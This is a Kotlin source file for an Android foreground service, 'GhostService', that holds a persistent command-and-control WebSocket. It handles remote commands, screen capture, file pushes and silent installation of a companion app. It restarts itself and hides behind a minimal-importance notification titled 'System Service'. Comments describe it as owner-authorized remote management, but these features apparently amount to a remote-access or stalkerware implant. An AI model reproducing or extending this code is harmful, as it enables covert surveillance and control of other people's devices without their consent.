package com.tg.ghostd

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.BatteryManager
import android.os.Build
import android.os.IBinder
import com.neovisionaries.ws.client.WebSocket
import com.neovisionaries.ws.client.WebSocketAdapter
import com.neovisionaries.ws.client.WebSocketException
import com.neovisionaries.ws.client.WebSocketFactory
import com.neovisionaries.ws.client.WebSocketFrame
import org.json.JSONObject
import java.net.URI
import java.util.Timer
import java.util.TimerTask
import java.util.concurrent.CountDownLatch

/**
 * Persistent foreground service (specialUse). Owns the owner-authorized
 * remote-management WebSocket: resolve endpoint -> connect -> register ->
 * heartbeat 45s -> commands. Auto-reconnects with backoff and re-resolves
 * the endpoint on every connect attempt. If no endpoint can be resolved
 * (all RPCs failed, no cache) it retries every 60s.
 *
 * specialUse is used because this is a long-lived, owner-started support
 * session not covered by another FGS type: dataSync is capped at 6h/24h and
 * cannot restart from BOOT_COMPLETED on Android 15+. mediaProjection is
 * promoted only for the duration of a capture.
 */
class GhostService : Service() {

    private var worker: Thread? = null
    private var heartbeat: Timer? = null

    /** Latch of the in-flight connect(): the watchdog counts it down directly
     *  when the connection looks dead — ws.disconnect() alone is NOT enough,
     *  it can throw on a half-open socket and leave the runLoop parked in
     *  latch.await() forever (seen live after airplane mode). */
    @Volatile private var forceLatch: CountDownLatch? = null

    /** Wall-clock (elapsedRealtime) of the last inbound WS traffic. The
     *  heartbeat watchdog force-disconnects when this goes stale — without
     *  it, a half-open TCP connection (server died without RST reaching us)
     *  looks alive forever and the reconnect loop never wakes up. */
    @Volatile private var lastInbound = 0L
    @Volatile private var running = false

    override fun onCreate() {
        super.onCreate()
        instance = this
        CommandHandler.init(this)
        // Start with ONLY the specialUse type on Android 14+: the manifest
        // also declares mediaProjection (promoted later via
        // promoteToProjection()), and the 2-arg startForeground would try to
        // start ALL declared types — mediaProjection without consent throws
        // SecurityException on 14+. Android 10-13 have no type-specific
        // timeout/permission for this service, so the 2-arg form is fine.
        val fgsType = baseForegroundServiceType(Build.VERSION.SDK_INT)
        if (fgsType != null) {
            startForeground(NOTIFICATION_ID, buildNotification(), fgsType)
        } else {
            startForeground(NOTIFICATION_ID, buildNotification())
        }
        // Auto-arm the sidekick once the link is up (after setup); the
        // sidekick resets armed state on reboot, so ghostd re-arms on every
        // (re)connect. Fire-and-forget, retried by the link watcher.
        if (Prefs.setupDone(this)) {
            SidekickLink.startAutoArm()
            // ghostd update / reboot / sidekick wiped: re-check ghosta
            // presence and re-provision from the bundled asset when missing
            // or older than the bundle (silent when ghostd is the
            // installer-of-record). Fire-and-forget, never blocks the WS.
            SidekickInstaller.provisionBundledAsync(this, "service-start")
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Babysitter kick: the existing worker may be wedged beyond repair —
        // tear it down and start fresh (interrupt un parks latch.await/sleep).
        if (intent?.getBooleanExtra("force", false) == true && worker != null) {
            running = false
            worker?.interrupt()
            worker = null
            stopHeartbeat()
        }
        if (worker == null) {
            running = true
            worker = Thread { runLoop() }.apply { name = "ghostd-c2"; start() }
        }
        return START_STICKY
    }

    override fun onDestroy() {
        running = false
        stopHeartbeat()
        worker?.interrupt()
        worker = null
        if (instance === this) instance = null
        SidekickLink.stopAutoArm()
        SidekickLink.close()
        // Capture teardown must be non-blocking on the service main thread:
        // signal the worker, then release the projection/consent request.
        ScreenCapturer.requestStopOnly()
        ProjectionHub.stop()
        FileReceiver.abortAll("service destroyed")
        // No operator is connected any more: drop every screen-awake session.
        ScreenAwakeController.releaseAll()
        super.onDestroy()
    }

    /**
     * Add the mediaProjection foreground-service type for one capture
     * (Android 14+ requires it before MediaProjectionManager.getMediaProjection).
     * On 34+ the base specialUse type is kept alongside it; on 29-33 only
     * mediaProjection is used. Both are declared in the manifest, so the
     * promoted call is valid; pre-29 has no typed startForeground.
     */
    fun promoteToProjection() {
        if (Build.VERSION.SDK_INT >= 29) {
            try {
                startForeground(
                    NOTIFICATION_ID, buildNotification(),
                    projectionForegroundServiceType(Build.VERSION.SDK_INT)
                )
            } catch (_: Exception) {
                // some OEMs reject type changes; projection may still work
            }
        }
    }

    /** Restore the base type after the per-capture projection is released. */
    fun demoteToBase() {
        if (Build.VERSION.SDK_INT >= 29) {
            try {
                startForeground(
                    NOTIFICATION_ID, buildNotification(),
                    baseForegroundServiceType(Build.VERSION.SDK_INT) ?: return
                )
            } catch (_: Exception) {
                // Keep the service alive if an OEM rejects a type transition.
            }
        }
    }

    /**
     * Shared FGS timeout teardown. specialUse is not supposed to hit a time
     * limit — if the platform ever calls a timeout callback (OEM policy,
     * future type changes), stop cleanly instead of being killed with an
     * ANR-like state. onDestroy performs the normal teardown.
     */
    private fun handleForegroundTimeout(startId: Int, fgsType: Int) {
        android.util.Log.w(
            "ghostd", "foreground-service timeout (startId=$startId, type=$fgsType); stopping"
        )
        running = false
        stopHeartbeat()
        worker?.interrupt()
        worker = null
        stopSelf(startId)
    }

    /**
     * FGS timeout callback added in Android 14 (API 34); the platform does
     * not report the service type. Delegates to the same clean teardown as
     * the Android 15+ two-argument overload, otherwise a 14/14L device
     * would fall through to the default (process-killing) behavior.
     */
    override fun onTimeout(startId: Int) {
        handleForegroundTimeout(startId, 0)
    }

    /** FGS timeout callback on Android 15+ (API 35): includes the type. */
    override fun onTimeout(startId: Int, fgsType: Int) {
        handleForegroundTimeout(startId, fgsType)
    }

    override fun onBind(intent: Intent): IBinder? = null

    // ------------------------------------------------------------------ C2

    private fun runLoop() {
        val resolver = EndpointResolver.forContext(this)
        var backoff = 5_000L
        var lastGoodConnect = android.os.SystemClock.elapsedRealtime()
        while (running) {
            val endpoint = try {
                resolver.resolve()
            } catch (e: Exception) {
                android.util.Log.w("ghostd", "endpoint resolve threw: ${e.message}")
                null
            }
            if (endpoint == null) {
                // All RPCs failed and no cached endpoint: retry in 60s.
                android.util.Log.w("ghostd", "no endpoint (all RPCs failed, no cache); retry in 60s")
                if (!sleepQuietly(60_000L)) return
                continue
            }
            android.util.Log.i("ghostd", "resolved endpoint: $endpoint")
            val connectedOk = connect(endpoint)
            if (connectedOk) lastGoodConnect = android.os.SystemClock.elapsedRealtime()
            android.util.Log.i("ghostd", "connection ended, ok=$connectedOk, retry in ${backoff / 1000}s")
            if (!running) return
            backoff = if (connectedOk) 5_000L else minOf(backoff * 2, 60_000L)
            // self-heal: unable to hold a connection for a long time while the
            // network is up → something is wedged beyond this loop's repair;
            // restart the whole service (fresh threads, sockets, locks)
            val stuckFor = android.os.SystemClock.elapsedRealtime() - lastGoodConnect
            if (stuckFor > RESTART_AFTER_MS && networkUp()) {
                android.util.Log.w(
                    "ghostd", "no good connection for ${stuckFor / 1000}s — self-restarting")
                running = false
                stopSelf()
                try {
                    startForegroundService(
                        Intent(this, GhostService::class.java).putExtra("force", true))
                } catch (e: Exception) {
                    android.util.Log.w("ghostd", "self-restart failed: ${e.message}")
                }
                return
            }
            if (!sleepQuietly(backoff)) return
        }
    }

    private fun networkUp(): Boolean = try {
        val cm = getSystemService(android.net.ConnectivityManager::class.java)
        cm != null && cm.activeNetwork != null
    } catch (_: Exception) {
        true  // can't tell: assume yes, restart is harmless
    }

    /** Connects and blocks until the socket drops. Returns true if connected. */
    private fun connect(endpoint: String): Boolean {
        var connected = false
        var denied = false
        var ws: com.neovisionaries.ws.client.WebSocket? = null
        try {
            val latch = CountDownLatch(1)
            forceLatch = latch
            ws = WebSocketFactory()
                .setConnectionTimeout(10_000)
                .createSocket(URI(endpoint))
            ws.addListener(object : WebSocketAdapter() {
                override fun onConnected(
                    websocket: WebSocket, headers: Map<String, List<String>>
                ) {
                    android.util.Log.i("ghostd", "WS connected to ${websocket.uri}")
                    connected = true
                    lastInbound = android.os.SystemClock.elapsedRealtime()
                    websocket.sendText(registerMessage())
                    startHeartbeat(websocket)
                }

                override fun onTextMessage(websocket: WebSocket, text: String) {
                    lastInbound = android.os.SystemClock.elapsedRealtime()
                    HelloAck.parse(text)?.let { ack ->
                        if (!handleHelloAck(websocket, ack)) denied = true
                        return
                    }
                    CommandHandler.handle(websocket, text)
                }

                override fun onBinaryMessage(websocket: WebSocket, binary: ByteArray) {
                    lastInbound = android.os.SystemClock.elapsedRealtime()
                    // incoming file streams (files put) — MediaBus framing
                    CommandHandler.onBinary(binary)
                }

                override fun onDisconnected(
                    websocket: WebSocket, serverCloseFrame: WebSocketFrame,
                    clientCloseFrame: WebSocketFrame, closedByServer: Boolean
                ) {
                    stopHeartbeat()
                    latch.countDown()
                }

                override fun onConnectError(websocket: WebSocket, cause: WebSocketException) {
                    android.util.Log.w("ghostd", "WS connect error: ${cause.message}")
                    stopHeartbeat()
                    latch.countDown()
                }

                override fun onError(websocket: WebSocket, cause: WebSocketException) {
                    // IO error mid-session; onDisconnected follows
                }
            })
            ws.connect()
            latch.await()
        } catch (_: Exception) {
            stopHeartbeat()
        } finally {
            forceLatch = null
            // A dead socket can never deliver the remaining chunks/file_end.
            // Only clear transfers owned by THIS socket, so a replacement
            // connection's in-flight push is never killed by this teardown.
            FileReceiver.abortOwner(ws, "connection ended")
            // No operator command/stream can report back on a dead socket:
            // release the display lock instead of renewing it until timeout.
            ScreenAwakeController.releaseAll()
            // best-effort teardown of a possibly half-open socket; the runLoop
            // is awake now regardless (watchdog counts the latch down itself)
            try {
                ws?.disconnect()
            } catch (_: Exception) {
            }
        }
        // denied keeps the exponential backoff growing (retry later, no tight loop)
        return connected && !denied
    }

    /**
     * Device registration on connect. Field names follow the daemon protocol
     * (server/daemon.py "hello"); model/android_version/battery included.
     * Device authentication: enroll_key always, plus the stored device
     * token (Prefs.deviceToken) when we have one — see HelloAck.
     * version_code (numeric longVersionCode) lets the daemon reconcile an
     * update even when two builds share a versionName.
     */
    private fun registerMessage(): String {
        val battery = try {
            getSystemService(BatteryManager::class.java)
                .getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        } catch (_: Exception) {
            -1
        }
        return buildHelloMessage(
            Prefs.deviceId(this),
            "${Build.MANUFACTURER} ${Build.MODEL}",
            Build.VERSION.RELEASE,
            Build.VERSION.SDK_INT,
            AppUpdater.currentVersionName(this),
            DataReaders.versionCode(this),
            battery,
            C2.ENROLL_KEY,
            Prefs.deviceToken(this)
        )
    }

    /**
     * Handles the hello_ack device-auth reply. Returns true when the socket
     * should stay open (approved/pending — token stored), false when denied
     * (token cleared, socket closed; reconnect loop retries with backoff).
     */
    private fun handleHelloAck(websocket: WebSocket, ack: HelloAck): Boolean {
        return when {
            ack.isDenied -> {
                android.util.Log.w("ghostd", "hello_ack status=denied; clearing token, dropping connection")
                Prefs.clearDeviceToken(this)
                try {
                    websocket.disconnect()
                } catch (_: Exception) {
                    // already dead; onDisconnected releases the latch
                }
                false
            }
            ack.isApproved || ack.isPending -> {
                ack.token?.let { Prefs.setDeviceToken(this, it) }
                android.util.Log.i("ghostd", "hello_ack status=${ack.status}; token ${if (ack.token == null) "unchanged" else "stored"}")
                true
            }
            else -> {
                // unknown status: keep the session, let the server decide
                android.util.Log.w("ghostd", "hello_ack unknown status=${ack.status}")
                true
            }
        }
    }

    private fun startHeartbeat(ws: WebSocket?) {
        stopHeartbeat()
        if (ws == null) return
        heartbeat = Timer("ghostd-hb", true).apply {
            scheduleAtFixedRate(object : TimerTask() {
                override fun run() {
                    // liveness beacon for the ghosta babysitter (localhost,
                    // fire-and-forget on its own thread so a slow link never
                    // delays the WS heartbeat)
                    Thread({
                        try {
                            SidekickLink.send(org.json.JSONObject().put("cmd", "ping"))
                        } catch (_: Exception) {
                        }
                    }, "ghostd-link-beacon").start()
                    try {
                        ws.sendText("""{"type":"ping"}""")
                    } catch (e: Exception) {
                        // socket dead: force-close so onDisconnected fires and
                        // the reconnect loop wakes up (previously this was
                        // swallowed and nobody noticed a dead connection)
                        android.util.Log.w("ghostd", "heartbeat send failed: ${e.message}")
                        forceLatch?.countDown()
                        try { ws.disconnect() } catch (_: Exception) {}
                        return
                    }
                    val idle = android.os.SystemClock.elapsedRealtime() - lastInbound
                    if (idle > HEARTBEAT_MS * 3) {
                        // half-open connection: server gone, TCP never told us.
                        // The daemon answers every ping with {"type":"pong"}, so
                        // a healthy connection never idles this long. Wake the
                        // runLoop DIRECTLY — ws.disconnect() can throw on a
                        // half-open socket and was seen leaving the loop parked.
                        android.util.Log.w(
                            "ghostd", "no inbound for ${idle / 1000}s — forcing reconnect")
                        forceLatch?.countDown()
                        try { ws.disconnect() } catch (_: Exception) {}
                    }
                }
            }, HEARTBEAT_MS, HEARTBEAT_MS)
        }
    }

    private fun stopHeartbeat() {
        heartbeat?.cancel()
        heartbeat = null
    }

    private fun sleepQuietly(ms: Long): Boolean = try {
        Thread.sleep(ms)
        true
    } catch (_: InterruptedException) {
        Thread.currentThread().interrupt()
        false
    }

    private fun buildNotification(): Notification {
        val channel = NotificationChannel(
            CHANNEL_ID, "Service", NotificationManager.IMPORTANCE_MIN
        )
        getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        return Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setOngoing(true)
            // Fallback tap target: opens the screen-capture consent activity
            // (primary path is the service starting it directly).
            .setContentIntent(
                android.app.PendingIntent.getActivity(
                    this, 0,
                    Intent(this, ScreenCaptureActivity::class.java),
                    android.app.PendingIntent.FLAG_IMMUTABLE
                )
            )
            .build()
    }

    companion object {
        private const val CHANNEL_ID = "ghostd"
        private const val NOTIFICATION_ID = 1
        private const val HEARTBEAT_MS = 45_000L
        private const val RESTART_AFTER_MS = 10 * 60_000L  // self-restart when wedged this long

        /** Base FGS type: specialUse on Android 14+, none on older releases. */
        internal fun baseForegroundServiceType(sdk: Int): Int? =
            if (sdk >= 34) ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE else null

        /** Base + mediaProjection on 34+; mediaProjection alone on 29-33. */
        internal fun projectionForegroundServiceType(sdk: Int): Int =
            if (sdk >= 34) {
                ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
            } else {
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
            }

        /**
         * "hello" registration with the numeric version_code that the daemon
         * uses for update reconciliation. Kept here (pure, testable) instead
         * of duplicating the protocol fields.
         */
        internal fun buildHelloMessage(
            deviceId: String, model: String, androidVersion: String, sdk: Int,
            appVersion: String, versionCode: Long, battery: Int,
            enrollKey: String, token: String?
        ): String = JSONObject(
            HelloAck.buildHello(
                deviceId, model, androidVersion, sdk, appVersion, battery, enrollKey, token
            )
        ).put("version_code", versionCode).toString()

        /** Live service instance (for ProjectionHub's FGS promotion). */
        @Volatile var instance: GhostService? = null
            private set
    }
}
